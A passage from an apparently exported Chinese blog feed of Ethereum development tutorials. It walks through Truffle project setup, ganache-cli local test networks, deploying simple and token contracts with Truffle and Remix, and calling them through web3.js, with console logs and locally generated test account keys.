<h4 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir demo</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> demo</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle init</span></span><br><span class="line">Downloading...</span><br><span class="line">Unpacking...</span><br><span class="line">Setting up...</span><br><span class="line">Unbox successful. Sweet!</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  Compile:        truffle compile</span><br><span class="line">  Migrate:        truffle migrate</span><br><span class="line">  Test contracts: truffle test</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> tree</span></span><br><span class="line">.</span><br><span class="line">├── contracts</span><br><span class="line">│   └── Migrations.sol</span><br><span class="line">├── migrations</span><br><span class="line">│   └── 1_initial_migration.js</span><br><span class="line">├── test</span><br><span class="line">├── truffle-config.js</span><br><span class="line">└── truffle.js</span><br><span class="line"></span><br><span class="line">3 directories, 4 files</span><br></pre></td></tr></table></figure>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>配置使用本地的 <code>ganache-cli</code> 测试网络</p>
<p>truffle.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  networks: &#123;  </span><br><span class="line">        development: &#123;  </span><br><span class="line">            host: <span class="string">'localhost'</span>,  </span><br><span class="line">            port: <span class="string">'8545'</span>,  <span class="comment">//cli默认端口是8545，gui默认7545</span></span><br><span class="line">            network_id: <span class="string">'*'</span> <span class="comment">// Match any network id  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以配置多个网络</p>
</blockquote>
<h4 id="编写合约代码"><a href="#编写合约代码" class="headerlink" title="编写合约代码"></a>编写合约代码</h4><p>Hello.sol<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.17</span>;</span><br><span class="line"></span><br><span class="line">contract Hello&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">sayhello</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">string name</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"Hello World"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">uint a,uint b</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint c</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>1_initial_migration.js 配置编译部署合约<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Migrations = artifacts.require(<span class="string">"./Migrations.sol"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Hello = artifacts.require(<span class="string">"./Hello.sol"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(Migrations);</span><br><span class="line">  deployer.deploy(Hello);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h4 id="编译和部署"><a href="#编译和部署" class="headerlink" title="编译和部署"></a>编译和部署</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ truffle compile</span><br><span class="line">$ truffle migrate</span><br><span class="line"></span><br><span class="line">Using network &apos;development&apos;.</span><br><span class="line"></span><br><span class="line">Running migration: 1_initial_migration.js</span><br><span class="line">  Deploying Migrations...</span><br><span class="line">  ... 0x430463c5f02367d3c00a0eb3facab3be1578aadcb770858e0ce767818fb6485a</span><br><span class="line">  Migrations: 0xcb5f27c8d6f01dba2fef4444b0b838aa8af5288a</span><br><span class="line">  Deploying Hello...</span><br><span class="line">  ... 0xf9316b965d67db613c6c85fff4cfa647701db396648ef3a1f9ce76b4c05c7b7e</span><br><span class="line">  Hello: 0x13369cf35bb4b60bb1bbd35f4413729d56490a6d</span><br><span class="line">Saving successful migration to network...</span><br><span class="line">  ... 0x5af709894fad67a85f766f8ec61ad6377d4c62cd5c058b4e49d201d3b59fadaa</span><br><span class="line">Saving artifacts...</span><br></pre></td></tr></table></figure>
<p>ganache-cli 控制台的log（发生了2笔交易。）：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eth_sendTransaction</span><br><span class="line"></span><br><span class="line">  Transaction: 0xf9316b965d67db613c6c85fff4cfa647701db396648ef3a1f9ce76b4c05c7b7e</span><br><span class="line">  Contract created: 0x13369cf35bb4b60bb1bbd35f4413729d56490a6d</span><br><span class="line">  Gas usage: 162663</span><br><span class="line">  Block Number: 7</span><br><span class="line">  Block Time: Tue May 15 2018 17:32:11 GMT+0800 (中国标准时间)</span><br><span class="line"></span><br><span class="line">eth_newBlockFilter</span><br><span class="line">eth_getFilterChanges</span><br><span class="line">eth_getTransactionReceipt</span><br><span class="line">eth_getCode</span><br><span class="line">eth_uninstallFilter</span><br><span class="line">eth_sendTransaction</span><br><span class="line"></span><br><span class="line">  Transaction: 0x5af709894fad67a85f766f8ec61ad6377d4c62cd5c058b4e49d201d3b59fadaa</span><br><span class="line">  Gas usage: 42008</span><br><span class="line">  Block Number: 8</span><br><span class="line">  Block Time: Tue May 15 2018 17:32:11 GMT+0800 (中国标准时间)</span><br><span class="line"></span><br><span class="line">eth_getTransactionReceipt</span><br></pre></td></tr></table></figure></p>
<p>成功之后，build/contracts目录下都是json文件，它就是合约的元数据，我们要与合约进行交互就是用到其中的abi和address。</p>
<h4 id="修改合约"><a href="#修改合约" class="headerlink" title="修改合约"></a>修改合约</h4><p>编译过的合约，如果版本没变，不会再次migrate，所以修改合约代码要重新 migrate。</p>
<p><code>truffle migrate --reset</code></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ truffle test</span><br><span class="line">Using network &apos;development&apos;.</span><br><span class="line">  0 passing (1ms)</span><br></pre></td></tr></table></figure>
<p>ganache-cli 控制台的log：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  Transaction: 0xd72b2538ee2e7770a7d3695cc233908c16d0eb9c96be9aab69d31a837238d4f6</span><br><span class="line">  Contract created: 0xbf3f89e5e3635467a899f86b532ba8d4329a9d5a</span><br><span class="line">  Gas usage: 277462</span><br><span class="line">  Block Number: 4</span><br><span class="line">  Block Time: Tue May 15 2018 16:24:06 GMT+0800 (中国标准时间)</span><br><span class="line"></span><br><span class="line">eth_newBlockFilter</span><br><span class="line">eth_getFilterChanges</span><br><span class="line">eth_getTransactionReceipt</span><br><span class="line">eth_getCode</span><br><span class="line">eth_uninstallFilter</span><br><span class="line">eth_sendTransaction</span><br><span class="line"></span><br><span class="line">  Transaction: 0xcf3ed3d31914eb20ba731646abe4b6c025316332aa487924922fad1eee9b52c3</span><br><span class="line">  Gas usage: 42008</span><br><span class="line">  Block Number: 5</span><br><span class="line">  Block Time: Tue May 15 2018 16:24:06 GMT+0800 (中国标准时间)</span><br></pre></td></tr></table></figure></p>
<h4 id="用truffle控制台与合约函数交互"><a href="#用truffle控制台与合约函数交互" class="headerlink" title="用truffle控制台与合约函数交互"></a>用truffle控制台与合约函数交互</h4><p>合约部署好了，就用使用它，调用他的函数<br><a href="https://yq.aliyun.com/articles/212944" target="_blank" rel="noopener">以下操作参考了这篇文章</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello.deployed().then(instance =&gt; contract = instance)</span><br></pre></td></tr></table></figure>
<p><code>Hello.deployed().then</code> 语句来取得 <code>Hello</code> 合约的 <code>Instance</code> （实例），并存到 <code>contract</code> 变量中，以方便后续的调用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ truffle console</span><br><span class="line"></span><br><span class="line">truffle(development)&gt; Hello.deployed().then(instance =&gt; contract = instance)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">很多打印</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">truffle(development)&gt; contract.sayhello()</span><br><span class="line"></span><br><span class="line">&apos;Hello World&apos;</span><br><span class="line"></span><br><span class="line">truffle(development)&gt; </span><br><span class="line">truffle(development)&gt; contract.add(1,44)</span><br><span class="line"></span><br><span class="line">&#123; tx: &apos;0x00724f11eaafd9eaa52315fb752aa935e75bad6c6a9ea654449874036dee23fc&apos;,</span><br><span class="line">  receipt:</span><br><span class="line">   &#123; transactionHash: &apos;0x00724f11eaafd9eaa52315fb752aa935e75bad6c6a9ea654449874036dee23fc&apos;,</span><br><span class="line">     transactionIndex: 0,</span><br><span class="line">     blockHash: &apos;0x31025dac9c6dc90aa1559e37002b174b15e86301cdab64607ba4f55e32234b7a&apos;,</span><br><span class="line">     blockNumber: 10,</span><br><span class="line">     gasUsed: 21976,</span><br><span class="line">     cumulativeGasUsed: 21976,</span><br><span class="line">     contractAddress: null,</span><br><span class="line">     logs: [],</span><br><span class="line">     status: &apos;0x01&apos;,</span><br><span class="line">     logsBloom: &apos;0xapos; &#125;,</span><br><span class="line">  logs: [] &#125;</span><br></pre></td></tr></table></figure>
<p>通常来说，写数据被称作<code>交易(transaction)</code>，读数据被称作<code>调用(call)</code> </p>
<ul>
<li>sayhello() 方法返回字符，不需要 gas（call） 。</li>
<li>add() 方法会改变数据在区块链上的状态，需要花费 gas （transaction）；</li>
</ul>
<h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p><a href="https://www.trufflesuite.com/tutorials/pet-shop" target="_blank" rel="noopener">官方的示例项目：宠物商店</a><br><a href="https://learnblockchain.cn/2018/01/12/first-dapp/" target="_blank" rel="noopener">官方的示例项目：宠物商店（中文翻译）</a><br><a href="https://www.jianshu.com/p/c570045078e6" target="_blank" rel="noopener">官方的示例项目：宠物商店（中文翻译:旧）</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>5.1、基于Ganache-Cli用Remix发布Token(代币)</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/5.1%E3%80%81%E5%9F%BA%E4%BA%8EGanache-Cli%E7%94%A8Remix%E5%8F%91%E5%B8%83Token(%E4%BB%A3%E5%B8%81)/</url>
    <content><![CDATA[<p>本文启动 ganache-cli </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ganache-cli</span><br><span class="line">Ganache CLI v6.1.0 (ganache-core: 2.1.0)</span><br><span class="line"></span><br><span class="line">Available Accounts</span><br><span class="line">==================</span><br><span class="line">(0) 0xef1e0310ecf99c3808940d351b8a4bd7566d0a71</span><br><span class="line">(1) 0xa91b4c17ff43421754a8b721a8e55ac2881d946b</span><br><span class="line">(2) 0x0a6d612ce9d06ee9bced7395f29b0167e059207e</span><br><span class="line">(3) 0xd64f06e3a98a41bea2a6fa290e742083206ee061</span><br><span class="line">(4) 0xd315be81ca72314a2434df898fe962e6b53db337</span><br><span class="line">(5) 0xd4b54a13c047214bfae17ee2e25bbe4891edf582</span><br><span class="line">(6) 0x630b76b384c423c231bbc3384b1333369296eff9</span><br><span class="line">(7) 0x5f10c0cc0a914d9e5711a4ae022c27f4be7013d4</span><br><span class="line">(8) 0xd7c06d6f55c44125a11d7d203bb24c86f786b37d</span><br><span class="line">(9) 0x2fc8126d7ea755089dc7337fe956f2f0369a205b</span><br><span class="line"></span><br><span class="line">Private Keys</span><br><span class="line">==================</span><br><span class="line">(0) 82d925b9235dcf17d2e7cb0907084bf44fa9ce7ab31a9d2375b5db75e2da0509</span><br><span class="line">(1) 3f02535f00fa0ab48c306e561491cb4e10c684cea0297ec23aa4e87322108723</span><br><span class="line">(2) a0c830651cac356ce0a1a1d471ae0a77d2f0cfbb869dbd2d7650d4827becf879</span><br><span class="line">(3) 60a0a77161316406a5c03453d9e85427357f4046939bd4f884561cc806a4dccf</span><br><span class="line">(4) 7914c24a44119f21071b2a7da59a4b07a8c665475b995e0491bf62e7b1cc0403</span><br><span class="line">(5) bc512c5af4b68021be1ea084e93acf87fd3c1dea4a3ad1eec60cc0ba408f5ac0</span><br><span class="line">(6) 2f1831f2ab30d0b091a4dced5dcac68c79fad0352727a5ab4edd694c3a9d4bd7</span><br><span class="line">(7) 963d08d6060e01eb9223e742f12955daf00f5cc54220001ce75353a50a017968</span><br><span class="line">(8) e3d724fa1a859afda107e9be2e3b0d5703705436bae1057280b8363bc6929fd8</span><br><span class="line">(9) 6a661a59913f97e6fbd9cc4d56e8fc4d6c098d7be14254d788a5917cfe498bfd</span><br><span class="line"></span><br><span class="line">HD Wallet</span><br><span class="line">==================</span><br><span class="line">Mnemonic:      penalty until vessel limit motor waste rule ability soft moral stem harsh</span><br><span class="line">Base HD Path:  m/44&apos;/60&apos;/0&apos;/0/&#123;account_index&#125;</span><br><span class="line"></span><br><span class="line">Listening on localhost:8545</span><br></pre></td></tr></table></figure>
<h4 id="编译合约"><a href="#编译合约" class="headerlink" title="编译合约"></a>编译合约</h4><p>打开<a href="https://remix.ethereum.org" target="_blank" rel="noopener">remix</a>，一样编译三个sol代码文件（参考上文）。</p>
<h4 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h4><p><code>Environment</code> 选择 <code>JavaScript VM</code> 代表所有资料都是存在本地。它会提供 5 个虚拟账户每个有 100 ETH，随便选择一个账户accout[0]部署合约，一个账户accout[1]作为收账。</p>
<p>账号地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xca35b7d915458ef540ade6068dfe2f44e8fa733c</span><br><span class="line"></span><br><span class="line">0x14723a09acff6d2a60dcdf7aa4aff308fddc160c</span><br></pre></td></tr></table></figure>
<p>部署参数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;10000000000000000000000&quot;,&quot;GGCoin&quot;,18,&quot;GG&quot;</span><br></pre></td></tr></table></figure></p>
<p>部署示例</p>
<p><img src="/images/blockchain/部署合约GG.png" alt="部署合约GG.png"></p>
<p>部署成功，自动显示我们的合约</p>
<p><img src="/images/blockchain/部署合约GG成功界面.png" alt="部署合约GG成功界面.png"></p>
<p>同时在log上点开扩展可以看到显示的debug信息</p>
<p><img src="/images/blockchain/部署合约log.png" alt="部署合约log.png"></p>
<h4 id="转账"><a href="#转账" class="headerlink" title="转账"></a>转账</h4><blockquote>
<p>accout[0] -&gt; accout[1] 转10个GG币</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;0x14723a09acff6d2a60dcdf7aa4aff308fddc160c&quot;,&quot;10000000000000000000&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/blockchain/GG转账.png" alt="GG转账.png"></p>
<p>log信息</p>
<p><img src="/images/blockchain/GG转账log.png" alt="GG转账log.png"></p>
<p>查询accout[1]余额：10个GG币<br><img src="/images/blockchain/GG查询余额.png" alt="GG查询余额.png"></p>
<blockquote>
<p>已上文章都是通过 Remix 在线部署合约的，接下来就要通过Truffle框架来实现了。</p>
</blockquote>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>6.1、基于truffle发布Token到测试私链</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/6.1%E3%80%81%E5%9F%BA%E4%BA%8Etruffle%E5%8F%91%E5%B8%83Token%E5%88%B0%E6%B5%8B%E8%AF%95%E7%A7%81%E9%93%BE/</url>
    <content><![CDATA[<blockquote>
<p>在上一篇文章《6、基于truffle框架部署合约》中，我们已经实现了部署一个简单的合约（sayhello和add），并且在控制台可以调用合约的函数。</p>
<p>本文将使用 <code>《5.1、基于Ganache-Cli用Remix发布Token(代币)》</code> 中sol代码，编译一个比较完整的合约，部署。</p>
</blockquote>
<h3 id="修改工程配置"><a href="#修改工程配置" class="headerlink" title="修改工程配置"></a>修改工程配置</h3><ol>
<li>sol代码加入到工程</li>
<li><p>修改 <code>1_initial_migration.js</code>文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Token = artifacts.require(<span class="string">"./Token.sol"</span>);</span><br><span class="line"><span class="keyword">var</span> StandardToken = artifacts.require(<span class="string">"./StandardToken.sol"</span>);</span><br><span class="line"><span class="keyword">var</span> TeaToken = artifacts.require(<span class="string">"./TeaToken.sol"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer.deploy(Migrations);</span><br><span class="line">  deployer.deploy(Token);</span><br><span class="line">  deployer.deploy(StandardToken);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//四个参数，是TeaToken的构造函数参数。</span></span><br><span class="line">  deployer.deploy(TeaToken,<span class="string">"10000000000000000000000"</span>,<span class="string">"BBCoin"</span>,<span class="number">18</span>,<span class="string">"BBC"</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>TeaToken的构造函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">TeaToken</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        uint256 _initialAmount, <span class="regexp">//</span>发行量</span></span></span><br><span class="line"><span class="function"><span class="params">        string _tokenName, <span class="regexp">//</span>token名称</span></span></span><br><span class="line"><span class="function"><span class="params">        uint8 _decimalUnits, <span class="regexp">//</span>小数位</span></span></span><br><span class="line"><span class="function"><span class="params">        string _tokenSymbol <span class="regexp">//</span>标识</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Give the creator all initial tokens  </span></span><br><span class="line">        balances[msg.sender] = _initialAmount; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update total supply              </span></span><br><span class="line">        totalSupply = _initialAmount;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the name for display purposes      </span></span><br><span class="line">        name = _tokenName;                  </span><br><span class="line">        <span class="comment">// Amount of decimals for display purposes</span></span><br><span class="line">        decimals = _decimalUnits;    </span><br><span class="line"></span><br><span class="line">         <span class="comment">// Set the symbol for display purposes     </span></span><br><span class="line">        symbol = _tokenSymbol;                              </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="编译部署"><a href="#编译部署" class="headerlink" title="编译部署"></a>编译部署</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> truffle compile</span></span><br><span class="line"><span class="meta">$</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> truffle migrate --reset</span></span><br><span class="line">Using network 'development'.</span><br><span class="line"></span><br><span class="line">Running migration: 1_initial_migration.js</span><br><span class="line">  Replacing Migrations...</span><br><span class="line">  ... 0x026473e96e19f2a0a32bc787a9cd5ef7c29cab71e5517e803c29b18d6cb08070</span><br><span class="line">  Migrations: 0xe70fc286df987d4eace8dc486cc5492c950e50c6</span><br><span class="line">  Deploying Token...</span><br><span class="line">  ... 0xf503e2b6663ade73b5a60ff7f6b82f6f1e87b07e2629bf5fad6a7bc654cb807b</span><br><span class="line">  Token: 0x75aa2709dcee2bcd4fcc530924e0fb90e83a58f5</span><br><span class="line">  Deploying StandardToken...</span><br><span class="line">  ... 0x4385d77ebae77be6efe0b65cf925f40bfaa0e0f518518745a4813d92204c2271</span><br><span class="line">  StandardToken: 0x2e6487e4d995dbba857362c7a0542bb76a6f11ae</span><br><span class="line">  Deploying TeaToken...</span><br><span class="line">  ... 0x3687702e5287e22cafd2d6ae3e41d0c3455b1306bca805541b2de174c5841a70</span><br><span class="line">  TeaToken: 0x6b528b7717777a90f4db0a96be268fc91610be35</span><br><span class="line">Saving successful migration to network...</span><br><span class="line">  ... 0x374db95d4ff26b0f9a817fd48dfa2e648193333091a92fb001c6338b9f2b49ee</span><br><span class="line">Saving artifacts...</span><br></pre></td></tr></table></figure>
<p>成功了，记下合约地址：<code>TeaToken: 0x6b528b7717777a90f4db0a96be268fc91610be35</code></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>7.2、基于H5通过web3.js交易代币</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/7.2%E3%80%81%E5%9F%BA%E4%BA%8EH5%E9%80%9A%E8%BF%87web3.js%E4%BA%A4%E6%98%93%E4%BB%A3%E5%B8%81/</url>
    <content><![CDATA[<p>后来看到这篇文章 <a href="http://truffle.tryblockchain.org/truffle-InteractingWithContracts-%E4%B8%8E%E5%90%88%E7%BA%A6%E4%BA%A4%E4%BA%92.html" target="_blank" rel="noopener">合约交互</a> 摘录：</p>
<blockquote>
<p>标准的与以太坊网络交互的方法是通过以太坊官方构建的<a href="https://github.com/ethereum/web3.js" target="_blank" rel="noopener">Web3</a>库。尽管这个库非常有用，但使用其提供接口与合约交互有些困难，特别是以太坊的新手。为降低学习曲线，Truffle使用<a href="https://github.com/ConsenSys/ether-pudding" target="_blank" rel="noopener">Ether Pudding</a>库，它也是基于Web3的基础之上，目的是为了让交互更简单。 </p>
</blockquote>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>基于《6.1、基于truffle框架部署完整合约(发布Token代币).md》的环境，启动Ganache-Gui，并且用<code>truffle</code>编译和部署好合约。</p>
<p>拷贝出 <code>abi</code> 和 <code>合约地址</code> 生成 <code>合约实例</code>，就可以通过 <code>web3.js</code> 调用合约的函数。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>以下是js部分代码，其实就是一个空的html，只要引入web3.js就可以运行了。</p>
<p><strong>js代码</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">typeof</span> web3 !== <span class="string">'undefined'</span>) &#123;</span><br><span class="line">        web3 = <span class="keyword">new</span> Web3(web3.currentProvider);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// set the provider you want from Web3.providers</span></span><br><span class="line">        web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//合约的 abi 信息</span></span><br><span class="line">	<span class="keyword">var</span> abi =[太长了，不写];</span><br><span class="line">    <span class="comment">//合约的地址</span></span><br><span class="line">    <span class="keyword">var</span> contractAddress = <span class="string">'0x78fa7e19c947457396b9300133e68a8783d5cc87'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> Mycontract = web3.eth.contract(abi).at(contractAddress);</span><br><span class="line">    <span class="keyword">var</span> coinbase = web3.eth.coinbase;</span><br><span class="line"></span><br><span class="line">    Mycontract.totalSupply(<span class="function"><span class="keyword">function</span>(<span class="params">error, result</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!error)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"查询发行量:"</span>+result.toNumber());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">console</span>.error(error);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> accout0 = <span class="string">'0x08b3142691c5cfbf78857cef6c971fffeb7b78cf'</span>;</span><br><span class="line">    Mycontract.balanceOf(accout0,<span class="function"><span class="keyword">function</span>(<span class="params">error, result</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!error)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"accout0 余额:"</span>+result.toNumber());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">console</span>.error(error);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    web3.eth.defaultAccount= coinbase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toaddress = <span class="string">'0x3d2eed83e5ca9c254734c7c642ef1c805c07a40a'</span>;</span><br><span class="line"></span><br><span class="line">    Mycontract.balanceOf(toaddress,<span class="function"><span class="keyword">function</span>(<span class="params">error, result</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!error)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"accout1 余额:"</span>+result.toNumber());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">console</span>.error(error);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    web3.eth.defaultAccount= web3.eth.coinbase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> mon = <span class="string">'10000000000000000000'</span>;</span><br><span class="line">    <span class="keyword">if</span>(web3.isAddress(toaddress))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"交易"</span>);</span><br><span class="line">        Mycontract.transfer(toaddress, mon ,<span class="function"><span class="keyword">function</span>(<span class="params">error, result</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"交易回调"</span>);</span><br><span class="line">            <span class="keyword">if</span>(!error)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"交易成功"</span>);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"transfer:"</span>+result);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"交易错误"</span>);</span><br><span class="line">                <span class="built_in">console</span>.error(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"非法地址"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>调用对应关系</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Mycontract.balanceOf 对应着合约上的函数 <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _owner</span>)</span></span><br><span class="line"><span class="function"><span class="title">Mycontract</span>.<span class="title">transfer</span> 对应着合约上的函数 <span class="title">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>)</span></span><br></pre></td></tr></table></figure>
<p><strong>运行结果分析</strong></p>
<ol>
<li><p>根据我们的合约，部署合约时的<code>初始发行代币</code>是存入到<code>执行部署合约的账号</code>下（默认是 <code>accout[0]</code>）</p>
</li>
<li><p>Mycontract.transfer居然需要MetaMask确认交易（登录了accout[0]），这是什么情况，肯定哪里不对？退出登录就一直报错：<code>invalid address</code></p>
</li>
<li><p>MetaMask 登录了 <code>accout[0]</code> 确认提交交易之后，<code>ganache-cli</code>  打印以下log，但是币一直转不过去，MetaMask也一直提示错误<code>Taking too long? Retry with a higher gas price here</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">#ganache-cli  </span><br><span class="line">eth_sendRawTransaction</span><br><span class="line">Transaction: <span class="number">0xc64173b80b34e946438d2502e778baf4a3af300d9c4cb0aebd74a5acb5c4f499</span></span><br><span class="line">Gas usage: <span class="number">36511</span></span><br><span class="line">Block <span class="built_in">Number</span>: <span class="number">7</span></span><br><span class="line">Block Time: Fri Jun <span class="number">08</span> <span class="number">2018</span> <span class="number">22</span>:<span class="number">58</span>:<span class="number">03</span> GMT+<span class="number">0800</span> (中国标准时间)</span><br></pre></td></tr></table></figure>
</li>
<li><p>换一个浏览器打开该页面，成功打印以下log，看来MetaMask 影响了呀。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">#web控制台</span><br><span class="line">交易</span><br><span class="line">查询发行量:<span class="number">1e+22</span></span><br><span class="line">accout0 余额:<span class="number">9.98e+21</span></span><br><span class="line">accout1 余额:<span class="number">20000000000000000000</span></span><br><span class="line">交易回调</span><br><span class="line">交易成功</span><br><span class="line">transfer:<span class="number">0x7832f4c0c251ee2072d4f20619988436807589a9c4159385364b597b9d727836</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>至此已完成一个Demo。</p>
</li>
<li><p>基于以上代码，稍微改造一下，就实现了一个拨币的页面了</p>
<p>代码：<code>tag v1.0</code> </p>
<p>效果如图：</p>
<p><img src="/images/blockchain/拨币.png" alt="拨币.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>7.1、基于H5调用web3.js接口查询余额</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE/7.1%E3%80%81%E5%9F%BA%E4%BA%8EH5%E8%B0%83%E7%94%A8web3.js%E6%8E%A5%E5%8F%A3%E6%9F%A5%E8%AF%A2%E4%BD%99%E9%A2%9D/</url>
    <content><![CDATA[<h4 id="启动-ganache-gui"><a href="#启动-ganache-gui" class="headerlink" title="启动 ganache-gui"></a>启动 ganache-gui</h4><p>打开就可以了</p>
